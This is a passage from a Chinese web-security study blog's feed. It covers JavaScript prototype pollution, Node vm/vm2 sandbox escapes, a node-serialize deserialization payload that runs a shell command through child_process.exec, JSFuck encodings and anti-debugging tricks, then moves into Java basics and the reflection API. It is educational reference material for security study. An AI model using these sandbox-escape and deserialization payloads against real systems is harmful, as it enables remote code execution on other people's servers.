class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span><span class=\"token function\">sayName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>p 是一个引用指向 Person 的对象。我们在 Person 的原型上定义了一个 sayName 方法和 age 属性，当我们执行 p.age 时，会先在 this 的内部查找（也就是构造函数内部），如果没有找到然后再沿着原型链向上追溯。</p>\n<p>这里的向上追溯是怎么向上的呢？这里就要使用  <code>__proto__</code>  属性来链接到原型（也就是 Person.prototype）进行查找。最终在原型上找到了 age 属性。</p>\n<h2 id=\"原型链污染\"><a class=\"anchor\" href=\"#原型链污染\">#</a> 原型链污染</h2>\n<p>如前文提到的，JavaScript 是动态继承，通过  <code>__proto__</code>  修改自身对象时会影响到有相同原型的对象。因此当键值对是用户可控的情况下，就可能出现原型链污染。</p>\n<h1 id=\"沙箱逃逸\"><a class=\"anchor\" href=\"#沙箱逃逸\">#</a> 沙箱逃逸</h1>\n<h2 id=\"前端沙箱\"><a class=\"anchor\" href=\"#前端沙箱\">#</a> 前端沙箱</h2>\n<p>在前端中，可能会使用删除  <code>eval</code>  ，重写  <code>Function.prototype.constructor</code>  /  <code>GeneratorFunction</code>  /  <code>AsyncFunction</code>  等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新 iframe 的方式来获取新的执行环境。</p>\n<h2 id=\"服务端沙箱\"><a class=\"anchor\" href=\"#服务端沙箱\">#</a> 服务端沙箱</h2>\n<p>JavaScript 提供了原生的 vm 模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的 JavaScript API 和全局的 NodeJS 环境。</p>\n<p>在原生的沙箱模块中，常用的逃逸方式为：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'vm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> sandbox <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">const</span> whatIsThis <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    const ForeignObject = this.constructor;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    const ForeignFunction = ForeignObject.constructor;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    const process = ForeignFunction(\"return process\")();</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    const require = process.mainModule.require;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    require(\"fs\");</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> sandbox<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>考虑到 JavaScript 原生 vm 模块的缺陷，有开发者设计了 vm2 来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>vm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token string\">'Promise.resolve().then(()=>&#123;while(1)console.log(\"foo\", Date.now());&#125;); while(1)console.log(Date.now())'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">console</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">.</span><span class=\"token function\">apply</span><span class=\"token punctuation\">(</span>console<span class=\"token punctuation\">,</span>arguments<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">timeout</span><span class=\"token operator\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h1 id=\"反序列化\"><a class=\"anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<h2 id=\"简介-4\"><a class=\"anchor\" href=\"#简介-4\">#</a> 简介</h2>\n<p>JavaScript 本身并没有反序列化的实现，但是一些库如 node-serialize、serialize-to-js 等支持了反序列化功能。这些库通常使用 JSON 形式来存储数据，但是和原生函数 JSON.parse、 JSON.stringify 不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。</p>\n<h2 id=\"payload构造\"><a class=\"anchor\" href=\"#payload构造\">#</a> Payload 构造</h2>\n<p>下面是一个最简单的例子，首先获得序列化后的输出</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> y <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token function-variable function\">rce</span> <span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ls /'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error<span class=\"token punctuation\">,</span> stdout<span class=\"token punctuation\">,</span> stderr</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">var</span> serialize <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'node-serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Serialized: \\n\"</span> <span class=\"token operator\">+</span> serialize<span class=\"token punctuation\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>上面执行后会返回</p>\n<pre><code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123;require('child_process').exec('ls /', function(error, stdout, stderr) &#123; console.log(stdout) &#125;);&#125;&quot;&#125;\n</code></pre>\n<p>不过这段 payload 反序列化后并不会执行，但是在 JS 中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如  <code>(function () &#123; /* code */ &#125; ());</code>  这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的 payload 测试如下:</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">var</span> serialize <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'node-serialize'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">var</span> payload <span class=\"token operator\">=</span> <span class=\"token string\">'&#123;\"rce\":\"_$$ND_FUNC$$_function ()&#123;require(\\'child_process\\').exec(\\'ls /\\', function(error, stdout, stderr) &#123; console.log(stdout) &#125;);&#125;()\"&#125;'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>serialize<span class=\"token punctuation\">.</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"payload构造-ii\"><a class=\"anchor\" href=\"#payload构造-ii\">#</a> Payload 构造 II</h2>\n<p>以上提到的是 node-serialize 这类反序列化库的构造方式，还有一类库如 funcster，是使用直接拼接字符串构造函数的方式来执行。</p>\n<pre><code>return &quot;module.exports=(function(module,exports)&#123;return&#123;&quot; + entries + &quot;&#125;;&#125;)();&quot;;\n</code></pre>\n<p>这种方式可以使用相应的闭合来构造 payload。</p>\n<h1 id=\"jsfuck-cheat-sheet\"><a class=\"anchor\" href=\"#jsfuck-cheat-sheet\">#</a> jsfuck cheat sheet</h1>\n<h2 id=\"basic-values\"><a class=\"anchor\" href=\"#basic-values\">#</a> Basic values</h2>\n<ul>\n<li><code>undefined</code>  &gt;  <code>[][[]]</code></li>\n<li><code>false</code>  &gt;  <code>![]</code></li>\n<li><code>true</code>  &gt;  <code>!![]</code></li>\n<li><code>NaN</code>  &gt;  <code>+[![]]</code></li>\n<li><code>0</code>  &gt;  <code>+[]</code></li>\n<li><code>1</code>  &gt;  <code>+!+[]</code></li>\n<li><code>2</code>  &gt;  <code>!+[]+!+[]</code></li>\n</ul>\n<h2 id=\"basic-strings\"><a class=\"anchor\" href=\"#basic-strings\">#</a> Basic strings</h2>\n<ul>\n<li><code>''</code>  &gt;  <code>[]+[]</code></li>\n<li><code>'undefined'</code>  &gt;  <code>[]+[][[]]</code></li>\n<li><code>'false'</code>  &gt;  <code>[]+![]</code></li>\n<li><code>'true'</code>  &gt;  <code>[]+!![]</code></li>\n<li><code>'NaN'</code>  &gt;  <code>[]+(+[![]])</code></li>\n<li><code>'0'</code>  &gt;  <code>[]+(+[])</code></li>\n<li><code>'1'</code>  &gt;  <code>[]+(+!+[])</code></li>\n<li><code>'2'</code>  &gt;  <code>[]+(!+[]+!+[])</code></li>\n<li><code>'10'</code>  &gt;  <code>[+!+[]]+[+[]]</code></li>\n<li><code>'11'</code>  &gt;  <code>[+!+[]]+[+!+[]]</code></li>\n<li><code>'100'</code>  &gt;  <code>[+!+[]]+[+[]]+(+[])</code></li>\n</ul>\n<h2 id=\"higher-numbers\"><a class=\"anchor\" href=\"#higher-numbers\">#</a> Higher numbers</h2>\n<ul>\n<li><code>10</code>  &gt;  <code>+([+!+[]]+[+[]])</code></li>\n<li><code>11</code>  &gt;  <code>+([+!+[]]+[+!+[]])</code></li>\n<li><code>100</code>  &gt;  <code>+([+!+[]]+[+[]]+(+[]))</code></li>\n</ul>\n<h2 id=\"string-alphabet\"><a class=\"anchor\" href=\"#string-alphabet\">#</a> String alphabet</h2>\n<ul>\n<li><code>'a'</code>  &gt;  <code>([]+![])[+!+[]]</code></li>\n<li><code>'d'</code>  &gt;  <code>([]+[][[]])[+!+[]+!+[]]</code></li>\n<li><code>'e'</code>  &gt;  <code>([]+!+[])[+!+[]+!+[]+!+[]]</code></li>\n<li><code>'f'</code>  &gt;  <code>([]+![])[+[]]</code></li>\n<li><code>'i'</code>  &gt;  <code>([]+[][[]])[+!+[]+!+[]+!+[]+!+[]+!+[]]</code></li>\n<li><code>'l'</code>  &gt;  <code>([]+![])[+!+[]+!+[]]</code></li>\n<li><code>'n'</code>  &gt;  <code>([]+[][[]])[+!+[]]</code></li>\n<li><code>'r'</code>  &gt;  <code>([]+!+[])[+!+[]]</code></li>\n<li><code>'s'</code>  &gt;  <code>([]+![])[+!+[]+!+[]+!+[]]</code></li>\n<li><code>'t'</code>  &gt;  <code>([]+!+[])[+[]]</code></li>\n<li><code>'u'</code>  &gt;  <code>([]+!+[])[+!+[]+!+[]]</code></li>\n</ul>\n<h1 id=\"trick\"><a class=\"anchor\" href=\"#trick\">#</a> Trick</h1>\n<h2 id=\"通过正则表达式构造特定字符\"><a class=\"anchor\" href=\"#通过正则表达式构造特定字符\">#</a> 通过正则表达式构造特定字符</h2>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>empty <span class=\"token operator\">=</span> <span class=\"token class-name\">RegExp</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>flags</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>regSource <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token operator\">...</span><span class=\"token class-name\">RegExp</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>source <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>regSource<span class=\"token punctuation\">.</span>toString <span class=\"token operator\">=</span> <span class=\"token class-name\">Array</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>shift</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>regSource<span class=\"token punctuation\">.</span>length <span class=\"token operator\">=</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>left  <span class=\"token operator\">=</span> regSource <span class=\"token operator\">+</span> empty <span class=\"token comment\">// 生成 (</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>quest <span class=\"token operator\">=</span> regSource <span class=\"token operator\">+</span> empty <span class=\"token comment\">// 生成？</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>colon <span class=\"token operator\">=</span> regSource <span class=\"token operator\">+</span> empty <span class=\"token comment\">// 生成 :</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>right <span class=\"token operator\">=</span> regSource <span class=\"token operator\">+</span> empty <span class=\"token comment\">// 生成 )</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>xss <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>xss<span class=\"token punctuation\">.</span>source <span class=\"token operator\">=</span> <span class=\"token string\">'xss'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>xss<span class=\"token punctuation\">.</span>flags <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>xss<span class=\"token punctuation\">.</span>toString <span class=\"token operator\">=</span> <span class=\"token class-name\">RegExp</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>toString</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>xss <span class=\"token operator\">+</span> <span class=\"token string\">\"\"</span> <span class=\"token comment\">// => /xss/a</span></pre></td></tr></table></figure><h1 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h1>\n<h2 id=\"命令执行\"><a class=\"anchor\" href=\"#命令执行\">#</a> 命令执行</h2>\n<p>Node.js 中 child_process.exec 命令调用的是  <code>/bin/sh</code>  ，故可以直接使用该命令执行 shell</p>\n<h2 id=\"反调试技巧\"><a class=\"anchor\" href=\"#反调试技巧\">#</a> 反调试技巧</h2>\n<ul>\n<li>函数重定义  <code>console.log = function(a)&#123;&#125;</code></li>\n<li>定时断点  <code>setInterval(function()&#123;debugger&#125;, 1000);</code></li>\n</ul>\n<h2 id=\"对象拷贝\"><a class=\"anchor\" href=\"#对象拷贝\">#</a> 对象拷贝</h2>\n<p>JavaScript 中的对象拷贝分为浅拷贝和深拷贝。</p>\n<p>浅拷贝对一个对象进行拷贝时，仅仅拷贝对象的引用进行拷贝，但是拷贝对象和源对象还是引用同一份实体。其中一个对象的改变都会影响到另一个对象。</p>\n<p>深拷贝拷贝一个对象时，不仅仅把对象的引用进行复制，还把该对象引用的值也一起拷贝。源对象与拷贝对象互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。</p>\n<p>深拷贝可以基于  <code>for-in</code>  /  <code>object.assign()</code>  / 拓展运算符  <code>...</code>  /  <code>JSON.parse(JSON.stringify())</code>  等方式实现。其中前三种方式只对第一层做深拷贝，若对象结构较为复杂，则需要用递归的方式对更深的层次进行拷贝。</p>\n<h2 id=\"常见sink\"><a class=\"anchor\" href=\"#常见sink\">#</a> 常见 Sink</h2>\n<ul>\n<li>child_process</li>\n<li>eval</li>\n<li>exec</li>\n<li>execSync</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy9zeXN0ZW0vMTYzNTc5Lmh0bWw=\">JavaScript 反调试技巧</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5lY21hLWludGVybmF0aW9uYWwub3JnL2VjbWEtMjYyLzUuMS8jc2VjLTE1LjMuNC41\">ECMAScript Language Specification</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM0MTgzNzQ2P3NvcnQ9Y3JlYXRlZA==\">js prototype</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Njc2Ntcy9ndWFyZEpzLw==\">javascript 防劫持</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2ZleC5iYWlkdS5jb20vYmxvZy8yMDE0LzA2L3hzcy1mcm9udGVuZC1maXJld2FsbC0zLmh0bWw=\">XSS 前端防火墙</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC8yMDE3LzAyLzA4L2V4cGxvaXRpbmctbm9kZS1qcy1kZXNlcmlhbGl6YXRpb24tYnVnLWZvci1yZW1vdGUtY29kZS1leGVjdXRpb24v\">exploiting node js deserialization bug for remote code execution</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hvTHlWaWVSL3Byb3RvdHlwZS1wb2xsdXRpb24tbnNlYzE4Lw==\">Prototype pollution attack</span> Content released at NorthSec 2018 on prototype pollution</li>\n</ul>\n",
            "tags": [
                "语言",
                "反序列化",
                "沙箱",
                "JavaScript"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Java/",
            "url": "https://mobius-0.github.io/security/WebNote/Languages%20and%20Frameworks/Java/",
            "title": "Java",
            "date_published": "2022-11-27T08:50:11.000Z",
            "content_html": "<h1 id=\"基本概念\"><a class=\"anchor\" href=\"#基本概念\">#</a> 基本概念</h1>\n<h2 id=\"jvm\"><a class=\"anchor\" href=\"#jvm\">#</a> JVM</h2>\n<p>JVM 是 Java 平台的核心，以机器代码来实现，为程序执行提供了所需的所有基本功能，例如字节码解析器、JIT 编译器、垃圾收集器等。由于它是机器代码实现的，其同样受到二进制文件受到的攻击。</p>\n<p>JCL 是 JVM 自带的一个标准库，含有数百个系统类。默认情况下，所有系统类都是可信任的，且拥有所有的特权。</p>\n<h2 id=\"jdk\"><a class=\"anchor\" href=\"#jdk\">#</a> JDK</h2>\n<p>Java 开发工具包 (Java Development Kit，JDK) 是 Oracle 公司发布的 Java 平台，有标准版 (Standard Edition，Java SE)、企业版 (Enterprise Edition，Java EE) 等版本。</p>\n<p>在最开始，JDK 以二进制形式发布，而后在 2006 年 11 月 17 日，Sun 以 GPL 许可证发布了 Java 的源代码，于是之后出现了 OpenJDK。</p>\n<h2 id=\"jmx\"><a class=\"anchor\" href=\"#jmx\">#</a> JMX</h2>\n<p>JMX (Java Management Extensions，Java 管理扩展) 是一个为应用程序植入管理功能的框架，主要为管理和监视应用程序、系统对象、设备和面向服务的网络提供相应的工具。JMX 可以远程读取系统中的值、调用系统中的方法。在 JMX 未配置身份验证或 JDK 版本过低存在反序列化漏洞时，可能会导致远程代码执行。</p>\n<h2 id=\"jni\"><a class=\"anchor\" href=\"#jni\">#</a> JNI</h2>\n<p>JNI (Java Native Interface) 是 Java 提供的和其他语言交互的接口。</p>\n<h2 id=\"jna\"><a class=\"anchor\" href=\"#jna\">#</a> JNA</h2>\n<p>JNA (Java Native Access) 是在 JNI 上的框架，用于自动实现 Java 接口到 native function 的映射，而不需要另外编写 JNI 代码。</p>\n<h2 id=\"ognl\"><a class=\"anchor\" href=\"#ognl\">#</a> OGNL</h2>\n<p>OGNL (Object-Graph Navigation Language，对象导航语言) 是一种功能强大的表达式语言，通过简单一致的表达式语法，提供了存取对象的任意属性、调用对象的方法、遍历整个对象的结构图、实现字段类型转化等功能。</p>\n<p>Struts2 中使用了 OGNL，提供了一个 ValueStack 类。ValueStack 分为 root 和 context 两部分。root 中是当前的 action 对象，context 中是 ActionContext 里面所有的内容。</p>\n<h2 id=\"io模型\"><a class=\"anchor\" href=\"#io模型\">#</a> IO 模型</h2>\n<p>Java 对操作系统的各种 IO 模型进行了封装，形成了不同的 API。</p>\n<h3 id=\"bio\"><a class=\"anchor\" href=\"#bio\">#</a> BIO</h3>\n<p>BIO (Blocking I/O) 是同步阻塞 I/O 模式，数据的读取写入必须阻塞在一个线程内等待其完成。</p>\n<h3 id=\"nio\"><a class=\"anchor\" href=\"#nio\">#</a> NIO</h3>\n<p>NIO (New I/O) 是一种同步非阻塞的 I/O 模型，在 Java 1.4 中引入，对应 java.nio 包，提供了 Channel , Selector，Buffer 等抽象。</p>\n<h3 id=\"aio\"><a class=\"anchor\" href=\"#aio\">#</a> AIO</h3>\n<p>AIO (Asynchronous I/O) 在 Java 7 中引入，是 NIO 的改进版，是异步非阻塞的 IO 模型，基于事件和回调机制实现。</p>\n<h2 id=\"反射\"><a class=\"anchor\" href=\"#反射\">#</a> 反射</h2>\n<h3 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h3>\n<p>Java 反射机制是指在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能被称为语言的反射机制。</p>\n<h3 id=\"相关类\"><a class=\"anchor\" href=\"#相关类\">#</a> 相关类</h3>\n<table>\n<thead>\n<tr>\n<th>类名</th>\n<th>用途</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Class</td>\n<td>类的实体</td>\n</tr>\n<tr>\n<td>Field</td>\n<td>类的成员变量</td>\n</tr>\n<tr>\n<td>Method</td>\n<td>类的方法</td>\n</tr>\n<tr>\n<td>Constructor</td>\n<td>类的构造方法</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"class相关\"><a class=\"anchor\" href=\"#class相关\">#</a> Class 相关</h3>\n<ul>\n<li>asSubclass(Class&lt;U&gt; clazz)\n<ul>\n<li>把传递的类的对象转换成代表其子类的对象</li>\n</ul>\n</li>\n<li>Cast\n<ul>\n<li>把对象转换成代表类或是接口的对象</li>\n</ul>\n</li>\n<li>getClassLoader()\n<ul>\n<li>获得类的加载器</li>\n</ul>\n</li>\n<li>getClasses()\n<ul>\n<li>返回一个数组，数组中包含该类中所有公共类和接口类的对象</li>\n</ul>\n</li>\n<li>getDeclaredClasses()\n<ul>\n<li>返回一个数组，数组中包含该类中所有类和接口类的对象</li>\n</ul>\n</li>\n<li>forName(String className)\n<ul>\n<li>根据类名返回类的对象</li>\n</ul>\n</li>\n<li>getName()：\n<ul>\n<li>获得类的完整路径名字</li>\n</ul>\n</li>\n<li>newInstance()\n<ul>\n<li>创建类的实例</li>\n</ul>\n</li>\n<li>getPackage()\n<ul>\n<li>获得类的包</li>\n</ul>\n</li>\n<li>getSimpleName()\n<ul>\n<li>获得类的名字</li>\n</ul>\n</li>\n<li>getSuperclass()\n<ul>\n<li>获得当前类继承的父类的名字</li>\n</ul>\n</li>\n<li>getInterfaces()\n<ul>\n<li>获得当前类实现的类或是接口</li>\n</ul>\n</li>\n<li>getField(String name)\n<ul>\n<li>获得某个公有的属性对象</li>\n</ul>\n</li>\n<li>getFields()\n<ul>\n<li>获得所有公有的属性对象</li>\n</ul>\n</li>\n<li>getDeclaredField(String name)\n<ul>\n<li>获得某个属性对象</li>\n</ul>\n</li>\n<li>getDeclaredFields()\n<ul>\n<li>获得所有属性对象</li>\n</ul>\n</li>\n<li>getAnnotation(Class&lt;A&gt; annotationClass)\n<ul>\n<li>返回该类中与参数类型匹配的公有注解对象</li>\n</ul>\n</li>\n<li>getAnnotations()\n<ul>\n<li>返回该类所有的公有注解对象</li>\n</ul>\n</li>\n<li>getDeclaredAnnotation(Class&lt;A&gt; annotationClass)\n<ul>\n<li>返回该类中与参数类型匹配的所有注解对象</li>\n</ul>\n</li>\n<li>getDeclaredAnnotations()\n<ul>\n<li>返回该类所有的注解对象</li>\n</ul>\n</li>\n<li>getConstructor(Class...&lt;?&gt; parameterTypes)\n<ul>\n<li>获得该类中与参数类型匹配的公有构造方法</li>\n</ul>\n</li>\n<li>getConstructors()\n<ul>\n<li>获得该类的所有公有构造方法</li>\n</ul>\n</li>\n<li>getDeclaredConstructor(Class...&lt;?&gt; parameterTypes)\n<ul>\n<li>获得该类中与参数类型匹配的构造方法</li>\n</ul>\n</li>\n<li>getDeclaredConstructors()\n<ul>\n<li>获得该类所有构造方法</li>\n</ul>\n</li>\n<li>getMethod(String name, Class...&lt;?&gt; parameterTypes)\n<ul>\n<li>获得该类某个公有的方法</li>\n</ul>\n</li>\n<li>getMethods()\n<ul>\n<li>获得该类所有公有的方法</li>\n</ul>\n</li>\n<li>getDeclaredMethod(String name, Class...&lt;?&gt; parameterTypes)\n<ul>\n<li>获得该类某个方法</li>\n</ul>\n</li>\n<li>getDeclaredMethods()\n<ul>\n<li>获得该类所有方法</li>\n</ul>\n</li>\n<li>isAnnotation()\n<ul>\n<li>如果是注解类型则返回 true</li>\n</ul>\n</li>\n<li>isAnnotationPresent(Class&lt;? extends Annotation&gt; annotationClass)\n<ul>\n<li>如果是指定类型注解类型则返回 true</li>\n</ul>\n</li>\n<li>isAnonymousClass()\n<ul>\n<li>如果是匿名类则返回 true</li>\n</ul>\n</li>\n<li>isArray()\n<ul>\n<li>如果是一个数组类则返回 true</li>\n</ul>\n</li>\n<li>isEnum()\n<ul>\n<li>如果是枚举类则返回 true</li>\n</ul>\n</li>\n<li>isInstance(Object obj)\n<ul>\n<li>如果 obj 是该类的实例则返回 true</li>\n</ul>\n</li>\n<li>isInterface()\n<ul>\n<li>如果是接口类则返回 true</li>\n</ul>\n</li>\n<li>isLocalClass()\n<ul>\n<li>如果是局部类则返回 true</li>\n</ul>\n</li>\n<li>isMemberClass()\n<ul>\n<li>如果是内部类则返回 true</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"field相关\"><a class=\"anchor\" href=\"#field相关\">#</a> Field 相关</h3>\n<ul>\n<li>equals(Object obj)\n<ul>\n<li>属性与 obj 相等则返回 true</li>\n</ul>\n</li>\n<li>get(Object obj)\n<ul>\n<li>获得 obj 中对应的属性值</li>\n</ul>\n</li>\n<li>set(Object obj, Object value)\n<ul>\n<li>设置 obj 中对应属性值</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"method相关\"><a class=\"anchor\" href=\"#method相关\">#</a> Method 相关</h3>\n<ul>\n<li>\n<p>invoke(Object obj, Object... args)</p>\n<ul>\n<li>传递 object 对象及参数调用该对象对应的方法</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"constructor\"><a class=\"anchor\" href=\"#constructor\">#</a> Constructor</h3>\n<ul>\n<li>\n<p>newInstance(Object... initargs)</p>\n<ul>\n<li>根据传递的参数创建类的对象</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"类\"><a class=\"anchor\" href=\"#类\">#</a> 类</h1>\n<h2 id=\"生命周期\"><a class=\"anchor\" href=\"#生命周期\">#</a> 生命周期</h2>\n<p>整体来说，Java 中类的生命周期如下：加载 (Loading) -&gt; [ 连接 (Linking) : 验证 (Verification) -&gt; 准备 (Perparation) -&gt; 解析 (Resolutin) ] -&gt; 初始化 (Initialization) -&gt; 使用 (Using) -&gt; 卸载 (Unloading) 。</p>\n<p>加载过程分为三步：</p>\n<ul>\n<li>通过全限定类名来获取定义此类的二进制字节流</li>\n<li>将字节流所代表的静态存储结构转化为方法区的运行时数据结构</li>\n<li>在内存中生成代表这个类的  <code>java.lang.Class</code>  对象，作为方法区这个类的各种数据的访问入口</li>\n</ul>\n<p>验证阶段主要用于确保 Class 文件的字节流符合当前虚拟机的要求，分为几步：</p>\n<ul>\n<li>判断文件格式：是否以  <code>0xCAFEBABE</code>  